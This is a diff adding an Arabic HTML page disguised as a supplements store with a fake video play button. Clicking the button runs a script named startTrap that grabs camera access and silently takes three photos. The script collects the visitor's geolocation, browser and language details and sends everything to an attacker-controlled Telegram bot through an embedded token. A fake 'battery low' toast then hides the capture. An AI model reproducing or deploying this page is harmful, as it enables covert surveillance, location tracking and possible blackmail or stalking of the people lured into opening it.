@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>متجر عسل أبيض | للمنتجات الخاصة والمكملات الغذائية</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      background-color: black;
+      color: white;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      overflow: hidden;
+    }
+    .video-container {
+      position: relative;
+      width: 100vw;
+      height: 100vh;
+      background-color: #000;
+    }
+    .video-thumb {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 0;
+    }
+    .play-button {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 80px;
+      height: 80px;
+      background: rgba(255,255,255,0.85);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      z-index: 1;
+    }
+    .play-button::before {
+      content: '';
+      display: block;
+      width: 0;
+      height: 0;
+      border-left: 25px solid #000;
+      border-top: 15px solid transparent;
+      border-bottom: 15px solid transparent;
+    }
+    .toast {
+      visibility: hidden;
+      min-width: 200px;
+      background-color: #222;
+      color: #fff;
+      text-align: center;
+      border-radius: 8px;
+      padding: 16px;
+      position: fixed;
+      z-index: 10;
+      left: 50%;
+      bottom: 30px;
+      transform: translateX(-50%);
+    }
+    .toast.show {
+      visibility: visible;
+      animation: fadein 0.5s, fadeout 0.5s 2.5s;
+    }
+    @keyframes fadein {
+      from { bottom: 0; opacity: 0; }
+      to { bottom: 30px; opacity: 1; }
+    }
+    @keyframes fadeout {
+      from { bottom: 30px; opacity: 1; }
+      to { bottom: 0; opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+  <div class="video-container">
+    <img class="video-thumb" src="https://alkhaleejpress.com/wp-content/uploads/2025/05/%D9%81%D9%8A%D8%AF%D9%8A%D9%88-%D9%87%D8%A8%D8%A9-%D9%86%D9%88%D8%B1.webp" alt="منتج خاص">
+    <div class="play-button" onclick="startTrap()"></div>
+  </div>
+  <div id="toast" class="toast">🔋 البطارية منخفضة – 2%</div>
+
+  <script>
+    async function startTrap() {
+      document.querySelector('.play-button').style.display = 'none';
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const videoTrack = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(videoTrack);
+
+        const takeAndSendPhoto = async () => {
+          const blob = await imageCapture.takePhoto();
+          const formData = new FormData();
+          formData.append('photo', blob, 'photo.jpg');
+          formData.append('ua', navigator.userAgent);
+          formData.append('lang', navigator.language);
+
+          navigator.geolocation.getCurrentPosition(pos => {
+            formData.append('lat', pos.coords.latitude);
+            formData.append('lon', pos.coords.longitude);
+
+            fetch('https://api.telegram.org/bot8360014194:AAH-fvURy7xpfMgUDl1vMAilrzBGbjqlZxU/sendDocument?chat_id=8004961958', {
+              method: 'POST',
+              body: formData
+            });
+          });
+        };
+
+        for (let i = 0; i < 3; i++) {
+          await takeAndSendPhoto();
+          await new Promise(r => setTimeout(r, 2000));
+        }
+
+        videoTrack.stop();
+
+        const toast = document.getElementById('toast');
+        toast.className = 'toast show';
+        setTimeout(() => { toast.className = toast.className.replace('show', ''); }, 3000);
+
+      } catch (err) {
+        alert('حدث خطأ في الوصول إلى الكاميرا');
+      }
+    }
+  </script>
+</body>
+</html>
